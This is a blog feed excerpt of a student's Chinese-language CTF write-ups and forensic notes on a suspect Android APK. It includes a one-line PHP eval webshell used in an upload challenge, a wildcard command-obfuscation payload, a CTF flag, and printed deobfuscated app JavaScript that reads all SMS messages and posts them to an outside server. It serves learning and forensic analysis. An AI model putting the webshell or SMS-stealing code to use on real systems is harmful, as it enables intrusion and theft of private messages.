title="basic-RSA"></a>basic-RSA</h3><ul><li>在RAS笔记里学长给做过，考察inverse()函数的应用</li></ul><h3 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h3><ul><li>hackbar浏览器插件使用方法：先LOAD后Use POST method加载网页<br><img src="/images/5-1.png"></li><li>直接URL后面添加，插件里添加后按EXECUTE执行<br><img src="/images/5-2.png"><br><img src="/images/5-3.png"></li><li>讲座后复刻，好像和学姐教的不一样？（但成功了~~后面问下</li><li>愚蠢，只需要下面部分，&lt;?php&gt;<br><img src="/images/5-4.png"></li><li>第三关：浏览器身份挑战-要求：我要battlefield_six浏览器</li><li>直接更改User-Agent<br><img src="/images/5-5.png"></li><li>要求：我要本地访问</li><li>解法：如图</li></ul><h3 id="super-baby-eval"><a href="#super-baby-eval" class="headerlink" title="super_baby_eval"></a>super_baby_eval</h3><ul><li>网页</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;eval&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;eval&#x27;</span>] === <span class="string">&#x27;gogogo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;evalpost&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;evalpost&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/5-6.png"><br><img src="/images/5-7.png"></p><ul><li>查看详细文件信息<br><img src="/images/5-8.png"></li><li>硬搜flag获得<br><img src="/images/5-9.png"><br><img src="/images/5-10.png"></li></ul><h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h3><ul><li>上传php文件</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>打开Burpsuite代理，记录端口信息<br><img src="/images/5-11.png"></li><li>打开中国蚁剑，右键添加数据，密码为php文件变量名<br><img src="/images/5-12.png"></li><li>双击数据进入网站文件，根目录寻找flag</li><li>成功！</li><li><a href="https://www.yuque.com/antswordproject/antsword/uvmwzn">参考</a></li></ul><h3 id="baby-eval"><a href="#baby-eval" class="headerlink" title="baby_eval"></a>baby_eval</h3><ul><li>hackbar body处输入code&#x3D;&#x2F;???&#x2F;?a??64 &#x2F;??a?</li><li>怀疑是&#x2F;bin因为&#x2F;?a?没反应应该不是cat</li><li>base64解码</li></ul><h3 id="super-baby-include"><a href="#super-baby-include" class="headerlink" title="super_baby_include"></a>super_baby_include</h3><ul><li>简单<br><img src="/images/5-13.png"></li></ul><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><ul><li>在HackBar的URL输入：http:&#x2F;&#x2F;靶机地址&#x2F;robots.txt</li><li>选择GET方法（不是POST）!!!</li><li>得到&#x2F;f1agggggggg.txt</li><li>输入URL得到flag<a href="flag%7BYou_1InD_ROB0T5!!!_20576b704467%7D"></a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 比赛笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 共模攻击 </tag>
            
            <tag> spc </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届长安杯笔记</title>
      <link href="/2025/10/01/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/10/01/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>目录：</p><ul><li><a href="#1-%E8%AF%B7%E8%AE%A1%E7%AE%97%E6%A3%80%E6%9D%90%E4%B8%80apk%E7%9A%84sha256%E5%80%BC">1. 请计算检材一Apk的SHA256值：</a></li><li><a href="#2-%E8%AF%A5apk%E7%9A%84%E5%BA%94%E7%94%A8%E5%8C%85%E5%90%8D%E4%B8%BA">2. 该APK的应用包名为</a></li><li><a href="#3-%E8%AF%A5apk%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%B0%81%E8%A3%85%E6%9C%8D%E5%8A%A1%E5%95%86%E7%9A%84%E5%BA%94%E7%94%A8%E5%94%AF%E4%B8%80%E6%A0%87%E8%AF%86appid%E4%B8%BA">3. 该APK程序在封装服务商的应用唯一标识（APPID）为</a></li><li><a href="#4-%E8%AF%A5apk%E5%85%B7%E5%A4%87%E4%B8%8B%E5%88%97%E5%93%AA%E4%BA%9B%E5%8D%B1%E9%99%A9%E6%9D%83%E9%99%90%E5%A4%9A%E9%80%89%E9%A2%98">4. 该APK具备下列哪些危险权限(多选题)：</a></li><li><a href="#5-%E8%AF%A5apk%E5%8F%91%E9%80%81%E5%9B%9E%E5%90%8E%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E5%90%AB%E4%B8%80%E4%B8%8B%E5%93%AA%E4%BA%9B%E5%86%85%E5%AE%B9%E5%A4%9A%E9%80%89%E9%A2%98">5. 该APK发送回后台服务器的数据包含一下哪些内容(多选题)：</a><ul><li><a href="#%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3">官方文档：</a></li></ul></li><li><a href="#6-%E8%AF%A5apk%E7%A8%8B%E5%BA%8F%E5%9B%9E%E4%BC%A0%E9%80%9A%E8%AE%AF%E5%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8%E7%9A%84http%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E4%B8%BA">6. 该APK程序回传通讯录时，使用的http请求方式为</a></li></ul><h4 id="1-请计算检材一Apk的SHA256值："><a href="#1-请计算检材一Apk的SHA256值：" class="headerlink" title="1. 请计算检材一Apk的SHA256值："></a>1. 请计算检材一Apk的SHA256值：</h4><p>1）直接将apk拖入hashcal计算<br>2）雷电APP智能分析直接出，但注意SHA256的主体是检材<br><img src="/images/2-1.png"><br>3）window自带工具：certutil -hashfile 检材一-zhibo.apk sha256</p><h4 id="2-该APK的应用包名为"><a href="#2-该APK的应用包名为" class="headerlink" title="2. 该APK的应用包名为"></a>2. 该APK的应用包名为</h4><p>1）使用jadx反编译，查看AndroidManifest.xml，package的值就是包名<br>2）雷电APP智能分析直接出<br><img src="/images/2-2.png"></p><h4 id="3-该APK程序在封装服务商的应用唯一标识（APPID）为"><a href="#3-该APK程序在封装服务商的应用唯一标识（APPID）为" class="headerlink" title="3. 该APK程序在封装服务商的应用唯一标识（APPID）为"></a>3. 该APK程序在封装服务商的应用唯一标识（APPID）为</h4><ul><li>使用jadx反编译，可以在assets的apps目录下找到，文件夹名字就是</li><li>xml文件第一行后面也有 package&#x3D;”plus.H5B8E45D3” ，应用包名后半部分与APPID一致（？不确定<br><img src="/images/2-5.png"><br>——<a href="https://www.cnblogs.com/WXjzc/p/16113357.html">来源</a><br><img src="/images/2-6.png"></li></ul><p><strong>查证：</strong></p><ol><li>“应用ID必须至少包含两段（一个或多个圆点）。每段必须以字母开头，所有字符必须为字母数字或下划线 [a-zA-Z0-9_]。例如，com.example.myapp 是一个有效的应用ID。”——<a href="https://www.oryoy.com/news/yi-zhao-jiao-ni-qing-song-huo-qu-android-ying-yong-de-wei-yi-biao-shi-appid-a13839322.html">来源</a><br><strong>应该是写错了这个讲的是应用包名</strong></li><li>问deepseek</li></ol><!-- 让表格居中显示的风格 --><style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><div class="center"><table><thead><tr><th align="left">维度</th><th align="left">APK 包名</th><th align="left">服务商 APPID</th></tr></thead><tbody><tr><td align="left"><strong>定义与归属</strong></td><td align="left">技术身份：在代码中定义，是应用在安卓系统中的唯一技术标识。</td><td align="left">商业身份：由应用商店或服务商（如华为、腾讯、阿里）分配，是其在平台生态内的唯一商业标识。</td></tr><tr><td align="left"><strong>设定者</strong></td><td align="left">开发者。</td><td align="left">服务商平台系统（当开发者上传应用时生成或分配）。</td></tr><tr><td align="left"><strong>唯一性范围</strong></td><td align="left">全球唯一（理论上）。谷歌建议使用逆序域名来确保这一点（如 <code>com.companyname.appname</code>）。</td><td align="left">平台内唯一。同一个应用在不同商店可能有不同的 APPID。</td></tr><tr><td align="left"><strong>是否可变</strong></td><td align="left">不可变。一旦发布，更改包名等同于创建了一个全新的应用。</td><td align="left">通常不变，但理论上平台有权重新分配。同一个应用更新版本，其 APPID 不变。</td></tr><tr><td align="left"><strong>主要用途</strong></td><td align="left">1. 系统识别：安卓系统通过包名来区分不同应用。<br>2. 安装与更新：系统根据包名判断是安装新应用还是更新现有应用。<br>3. 进程标识：应用进程名通常以包名开头。</td><td align="left">1. 平台管理：用于商店后台的统计、更新、收费管理等。<br>2. API 调用：集成该服务商 SDK（如推送、登录、支付）时，需要用 APPID 来标识自身。<br>3. 应用分发：生成商店下载链接。</td></tr><tr><td align="left"><strong>示例</strong></td><td align="left"><code>com.tencent.mm</code> (微信)<br><code>com.netease.cloudmusic</code> (网易云音乐)</td><td align="left">华为应用市场：<code>C1000000001</code><br>腾讯开放平台：<code>110xxxxxx</code><br>阿里应用分发：<code>12345</code></td></tr></tbody></table></div>在您提供的案例中（包名为 plus.H5B8E45D3，文件夹名为 H5B8E45D3），文件夹名就是APPID的可能性超过了90%。因为这种“包名 = 固定前缀 + APPID”的结构，本身就是服务商为了将技术标识和商业标识强绑定而设计的。因此，在资源目录下使用APPID作为路径的一部分，是保持逻辑一致性的最合理做法。<ul><li>还是不清楚但解题可以APP直接做到<br><img src="/images/2-3.png"><br>“当然也可以去网站源文件里面确认，就是看ID”（？没找到APP内的地方）——<a href="https://blog.csdn.net/ntrybw/article/details/126977777">来源</a></li></ul><h4 id="4-该APK具备下列哪些危险权限-多选题-："><a href="#4-该APK具备下列哪些危险权限-多选题-：" class="headerlink" title="4. 该APK具备下列哪些危险权限(多选题)："></a>4. 该APK具备下列哪些危险权限(多选题)：</h4><p>A.读取短信  B.读取通讯录 C.读取精确位置 D.修改通讯录 E.修改短信</p><ul><li>APP直接做到<br><img src="/images/2-4.png"></li><li>xml文件内查找</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INSTALL_PACKAGES&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.REQUEST_INSTALL_PACKAGES&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera.autofocus&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.SEND_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.GET_ACCOUNTS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_CONTACTS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CHANGE_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_LOGS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SETTINGS&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.huawei.android.launcher.permission.CHANGE_BADGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.asus.msa.SupplementaryDID.ACCESS&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><!-- 让表格居中显示的风格 --><style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><div class="center"><!-- 表格输入位置 --> <table><thead><tr><th align="left">name&#x3D;后面的字符串</th><th align="left">对应代表权限意思</th></tr></thead><tbody><tr><td align="left"><code>android.permission.INTERNET</code></td><td align="left">访问互联网</td></tr><tr><td align="left"><code>android.permission.WRITE_EXTERNAL_STORAGE</code></td><td align="left">写入外部存储</td></tr><tr><td align="left"><code>android.permission.ACCESS_NETWORK_STATE</code></td><td align="left">访问网络状态</td></tr><tr><td align="left"><code>android.permission.ACCESS_WIFI_STATE</code></td><td align="left">访问Wi-Fi状态</td></tr><tr><td align="left"><code>android.permission.INSTALL_PACKAGES</code></td><td align="left">安装程序包</td></tr><tr><td align="left"><code>android.permission.REQUEST_INSTALL_PACKAGES</code></td><td align="left">请求安装程序包</td></tr><tr><td align="left"><code>android.hardware.camera</code></td><td align="left">需要摄像头 (硬件功能)</td></tr><tr><td align="left"><code>android.hardware.camera.autofocus</code></td><td align="left">需要自动对焦 (硬件功能)</td></tr><tr><td align="left"><code>android.permission.ACCESS_COARSE_LOCATION</code></td><td align="left">访问粗略位置</td></tr><tr><td align="left"><code>android.permission.ACCESS_FINE_LOCATION</code></td><td align="left">访问精确位置</td></tr><tr><td align="left"><code>android.permission.READ_CONTACTS</code></td><td align="left">读取联系人</td></tr><tr><td align="left"><code>android.permission.READ_SMS</code></td><td align="left">读取短信</td></tr><tr><td align="left"><code>android.permission.RECEIVE_SMS</code></td><td align="left">接收短信</td></tr><tr><td align="left"><code>android.permission.ACCESS_COARSE_LOCATION</code></td><td align="left">访问粗略位置</td></tr><tr><td align="left"><code>android.permission.ACCESS_FINE_LOCATION</code></td><td align="left">访问精确位置</td></tr><tr><td align="left"><code>android.permission.SEND_SMS</code></td><td align="left">发送短信</td></tr><tr><td align="left"><code>android.permission.WRITE_SMS</code></td><td align="left">写入短信</td></tr><tr><td align="left"><code>android.permission.GET_ACCOUNTS</code></td><td align="left">获取账户列表</td></tr><tr><td align="left"><code>android.permission.WRITE_CONTACTS</code></td><td align="left">写入联系人</td></tr><tr><td align="left"><code>android.permission.ACCESS_WIFI_STATE</code></td><td align="left">访问Wi-Fi状态</td></tr><tr><td align="left"><code>android.permission.ACCESS_NETWORK_STATE</code></td><td align="left">访问网络状态</td></tr><tr><td align="left"><code>android.permission.CHANGE_WIFI_STATE</code></td><td align="left">更改Wi-Fi状态</td></tr><tr><td align="left"><code>android.permission.READ_PHONE_STATE</code></td><td align="left">读取手机状态</td></tr><tr><td align="left"><code>android.permission.WRITE_EXTERNAL_STORAGE</code></td><td align="left">写入外部存储</td></tr><tr><td align="left"><code>android.permission.MOUNT_UNMOUNT_FILESYSTEMS</code></td><td align="left">挂载和卸载文件系统</td></tr><tr><td align="left"><code>android.permission.READ_LOGS</code></td><td align="left">读取系统日志</td></tr><tr><td align="left"><code>android.permission.WRITE_SETTINGS</code></td><td align="left">写入系统设置</td></tr><tr><td align="left"><code>com.huawei.android.launcher.permission.CHANGE_BADGE</code></td><td align="left">华为角标权限</td></tr><tr><td align="left"><code>android.permission.READ_EXTERNAL_STORAGE</code></td><td align="left">读取外部存储</td></tr><tr><td align="left"><code>com.asus.msa.SupplementaryDID.ACCESS</code></td><td align="left">华硕补充设备ID权限</td></tr></tbody></table></div><p>反思：联网可以直接丢给ai，断网可以复制黏贴到txt搜索read,write等词<br><a href="https://www.cnblogs.com/linn/p/4046180.html">网上找到的对应关系表，在images文件夹存储文件名为：安卓权限中英文对应表.jpeg</a></p><h4 id="5-该APK发送回后台服务器的数据包含一下哪些内容-多选题-："><a href="#5-该APK发送回后台服务器的数据包含一下哪些内容-多选题-：" class="headerlink" title="5. 该APK发送回后台服务器的数据包含一下哪些内容(多选题)："></a>5. 该APK发送回后台服务器的数据包含一下哪些内容(多选题)：</h4><p>A.手机通讯录 B.手机应用列表 C.手机号码 D.验证码 E.GPS定位信息</p><ul><li>雷电软件 其他模式抓不到，使用代理模式抓包能抓到CD【复刻失败方法】<br><img src="/images/2-7.png"><br><img src="/images/2-8.png"></li><li>模拟器请求手机通讯录，猜测有A</li></ul><h5 id="官方文档："><a href="#官方文档：" class="headerlink" title="官方文档："></a>官方文档：</h5><ul><li><p>抓包方式介绍</p></li><li><p>雷电APP智能分析软件目前提供了4种抓包方式，分别是<strong>HTTP、TCP、代理模式、TCPDump</strong>，Android 支持全部4种方式，iOS 目前只支持代理模式抓包，下面分别介绍四种方式的应用场景：</p><ul><li>HTTP 方式是基于手机 VPN 原理实现的抓包，一般情况下如果是要抓HTTP 协议的网络数据包推荐这种方式，不过后台服务器已经不在运行的情况下使用该方式无法抓取到网络数据包。</li><li>TCP 方式同样是基于手机 VPN 原理实现的抓包，如果网络数据包是原生 TCP 协议的话推荐使用这种方式。</li><li>代理模式是基于在手机或者模拟器上设置代理地址实现的抓包（和 fiddler、charles 原理相同），软件会自动设置代理 IP 地址，无需手动填写代理地址，这种方式的优点是后台服务器不在运行的情况下也能抓到请求的网络数据包。</li><li>TCPDump 模式是基于 libpcap 库的抓包，根据使用者的定义对网络上的数据包进行截获，可以将网络中传送的数据包完全截获下来提供分析，这种方式的优点是可以抓取到所有协议的网络数据包。</li></ul></li><li><p>抓包方式选用</p><ul><li>抓 HTTP 协议首选 HTTP 方式抓包，后台服务器不存在的情况下选择代理模式抓包；</li><li>抓 TCP 协议选择 TCP 方式抓包；</li><li>在其他方式都抓包无果的情况下，建议使用 TCPDump 进行尝试；</li></ul></li><li><p>抓包注意事项</p><ul><li>代理模式和 TCPDump 抓包不能自动区分网络数据包是来源哪个应用的，有可能会混入非当前 APP 的网络数据包，因此需要自己筛选判断；</li><li>代理模式如果使用的是真机，真机需要和 PC 保持在同一局域网；</li><li>代理模式和 TCPDump 抓到的网络数据包需要先在分析结果页中将目标数据包添加标记后才能导出到 Word&#x2F;PDF 报告；</li><li>Android 设备使用代理模式时软件会自动设置代理，结束抓包的时候软件会自动清除代理。如果没有正常结束代理模式抓包，可能会因残留的代理设置导致Android设备无法上网，可以使用雷电APP自动修复；</li><li>iOS 设备使用代理模式时需要自己安装证书、配置代理设置以及清除代理设置；</li><li>TCPDump 抓包模式下不会实时更新抓包结果，只有在点击结束后才会进行解析并展示抓包结果；</li><li>TCPDump 的抓包结果目前只支持 HTTP 请求的解析，HTTPS 请求需要借 Wireshark 进行分析。</li></ul></li><li><p>jadx搜索<br><img src="/images/2-6.png"><br><img src="/images/2-10.png"></p></li><li><p><a href="https://ctf.bugku.com/tool/sojson4">解密网站</a>得到：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">*Aman - 194nb.com</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line"> *Progcessed By JSDec in 0.00s</span><br><span class="line"> *JSDec - JSDec.js.org</span><br><span class="line"> */</span><br><span class="line">mui.init();</span><br><span class="line"></span><br><span class="line">mui.plusReady(function () &#123;</span><br><span class="line">//var main = plus.android.runtimeMainActivity();  </span><br><span class="line">// main.moveTaskToBack(false);</span><br><span class="line"></span><br><span class="line">var address = plus.device.vendor + &#x27;-&#x27; + plus.device.model;</span><br><span class="line">address = address.replace(/\n/g, &quot;&quot;).replace(/ /g, &quot;&quot;).replace(/\r/g, &quot;&quot;);</span><br><span class="line">var apiserver = &#x27;http://www.honglian7001.com/api/uploads/&#x27;;</span><br><span class="line">//重复数据处理 预防用户重复点击</span><br><span class="line">var danjishijian = true;</span><br><span class="line">function requestPermission(sjh, yqm) &#123;</span><br><span class="line">plus.android.requestPermissions(</span><br><span class="line">[&quot;android.permission.READ_SMS&quot;],</span><br><span class="line">function (resultObj) &#123;</span><br><span class="line">//SmsInfo存放一条短信的各项内容</span><br><span class="line">var SmsInfo = &#123;&#125;</span><br><span class="line">//Sms存放所有短信</span><br><span class="line">var Sms = &#123;&#125;</span><br><span class="line"></span><br><span class="line">var aimei = sjh;</span><br><span class="line">var aimei2 = yqm;</span><br><span class="line">var duanxin = &#x27;[&#123;&quot;imei&quot;:&quot;&#x27; + aimei + &#x27;&quot;,&quot;imei2&quot;:&quot;&#x27; + aimei2 + &#x27;&quot;&#125;&#x27;;</span><br><span class="line">var Cursor = plus.android.importClass(&quot;android.database.Cursor&quot;)</span><br><span class="line">var Uri = plus.android.importClass(&quot;android.net.Uri&quot;)   //注意啦，android.net.Uri中的net是小写</span><br><span class="line">var activity = plus.android.runtimeMainActivity()</span><br><span class="line">var uri = Uri.parse(&quot;content://sms/&quot;);</span><br><span class="line"></span><br><span class="line">var projection = new Array(&quot;_id&quot;, &quot;address&quot;, &quot;person&quot;, &quot;body&quot;, &quot;date&quot;, &quot;type&quot;)</span><br><span class="line">var cusor = activity.managedQuery(uri, projection, null, null, &quot;date desc&quot;)</span><br><span class="line">var idColumn = cusor.getColumnIndex(&quot;_id&quot;)</span><br><span class="line">var nameColumn = cusor.getColumnIndex(&quot;person&quot;)</span><br><span class="line">var phoneNumberColumn = cusor.getColumnIndex(&quot;address&quot;)</span><br><span class="line">var smsbodyColumn = cusor.getColumnIndex(&quot;body&quot;)</span><br><span class="line">var dateColumn = cusor.getColumnIndex(&quot;date&quot;)</span><br><span class="line">var typeColumn = cusor.getColumnIndex(&quot;type&quot;)</span><br><span class="line">if (cusor != null) &#123;</span><br><span class="line">while (cusor.moveToNext()) &#123;</span><br><span class="line">SmsInfo.id = cusor.getString(idColumn)</span><br><span class="line">SmsInfo.Name = cusor.getInt(nameColumn)</span><br><span class="line">SmsInfo.Date = cusor.getLong(dateColumn)</span><br><span class="line">SmsInfo.Date = getFormatDate(SmsInfo.Date)</span><br><span class="line">SmsInfo.PhoneNumber = cusor.getString(phoneNumberColumn)</span><br><span class="line">SmsInfo.Smsbody = cusor.getString(smsbodyColumn)</span><br><span class="line">SmsInfo.Type = cusor.getString(typeColumn)</span><br><span class="line"></span><br><span class="line">var post = JSON.stringify(SmsInfo);</span><br><span class="line">//console.log(post);</span><br><span class="line">duanxin = duanxin + &#x27;,&#x27; + post;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">duanxin = duanxin + &#x27;]&#x27;;</span><br><span class="line">//alert(duanxin);</span><br><span class="line"></span><br><span class="line">mui.ajax(apiserver + &#x27;apisms&#x27;, &#123;</span><br><span class="line">data: &#123;</span><br><span class="line">data: duanxin</span><br><span class="line">&#125;,</span><br><span class="line">dataType: &#x27;text&#x27;,//服务器返回json格式数据</span><br><span class="line">type: &#x27;post&#x27;,//HTTP请求类型</span><br><span class="line">timeout: 10000,//超时时间设置为10秒；              </span><br><span class="line">success: function (data) &#123;</span><br><span class="line">mui.toast(&#x27;获取成功&#x27;)</span><br><span class="line">//console.log(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line">error: function (xhr, type, errorThrown) &#123;</span><br><span class="line">//异常处理；</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">cusor.close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line">function (error) &#123;</span><br><span class="line">console.log(&#x27;申请权限错误：&#x27; + error.code + &quot; = &quot; + error.message);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//扩展Date功能：将long型日期转换为特定的格式</span><br><span class="line">Date.prototype.format = function (format) &#123;</span><br><span class="line">var o = &#123;</span><br><span class="line">&quot;M+&quot;: this.getMonth() + 1,</span><br><span class="line">&quot;d+&quot;: this.getDate(),</span><br><span class="line">&quot;h+&quot;: this.getHours(),</span><br><span class="line">&quot;m+&quot;: this.getMinutes(),</span><br><span class="line">&quot;s+&quot;: this.getSeconds(),</span><br><span class="line">&quot;q+&quot;: Math.floor((this.getMonth() + 3) / 3),</span><br><span class="line">&quot;S&quot;: this.getMilliseconds()</span><br><span class="line">&#125;</span><br><span class="line">if (/(y+)/.test(format)) &#123;</span><br><span class="line">format = format.replace(RegExp.$1, (this.getFullYear() + &quot;&quot;).substr(4 - RegExp.$1.length));</span><br><span class="line">&#125;</span><br><span class="line">for (var k in o) &#123;</span><br><span class="line">if (new RegExp(&quot;(&quot; + k + &quot;)&quot;).test(format)) &#123;</span><br><span class="line">format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : (&quot;00&quot; + o[k]).substr((&quot;&quot; + o[k]).length));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return format;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//将long型日期转换为特定格式</span><br><span class="line">function getFormatDate(l, pattern) &#123;</span><br><span class="line">date = new Date(l);</span><br><span class="line">if (pattern == undefined) &#123;</span><br><span class="line">pattern = &quot;yyyy-MM-dd hh:mm:ss&quot;;</span><br><span class="line">&#125;</span><br><span class="line">return date.format(pattern);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//alert(plus.device.uuid)</span><br><span class="line">plus.navigator.setStatusBarBackground(&quot;#db6eff&quot;);</span><br><span class="line"></span><br><span class="line">mui(&quot;body&quot;).off(&quot;tap&quot;);</span><br><span class="line"></span><br><span class="line">mui(&quot;body&quot;).on(&#x27;tap&#x27;, 